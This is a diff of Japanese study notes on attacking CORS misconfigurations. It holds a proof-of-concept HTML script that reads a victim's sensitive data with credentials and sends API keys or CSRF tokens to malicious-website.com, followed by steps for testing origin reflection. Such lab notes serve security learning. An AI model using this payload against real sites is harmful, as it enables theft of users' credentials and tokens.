@@ -23,17 +23,24 @@
 
 - 以下のスクリプトをWebサイトに配置することで、レスポンスに含まれるAPIキーだったり、CSRFトークンだったりが盗める。
 ```html
-var req = new XMLHttpRequest();
-req.onload = reqListener;
-req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
-req.withCredentials = true;
-req.send();
-
-function reqListener() {
-	location='//malicious-website.com/log?key='+this.responseText;
-};
+<html>
+	<script>
+	var req = new XMLHttpRequest();
+	req.onload = reqListener;
+	req.open('get','https://vulnerable-website.com/sensitive-victim-data',true); /** ←ターゲットサーバのURLとAPIキーなどが生成されている箇所を入力。 **/
+	req.withCredentials = true;
+	req.send();
+	
+	function reqListener() {
+		location='//malicious-website.com/log?key='+this.responseText;
+	}; // ← APIを受け取る先を指定する。
+	</script>
+</html>
 ```
 
 ---
 ## 攻撃の説明
 ### 基本的なオリジンリフレクションによるCORSの脆弱性
+1. リクエストヘッダーに`Origin: http://hoge.com/`を追加して、`Access-Control-Allow-Origin:`と`Access-Control-Allow-Credentials: true`がレスポンスにあるかを確認。
+	![[Pasted image 20251004184839.png]]
+2. `python -m http.server`を起動しリッスン、
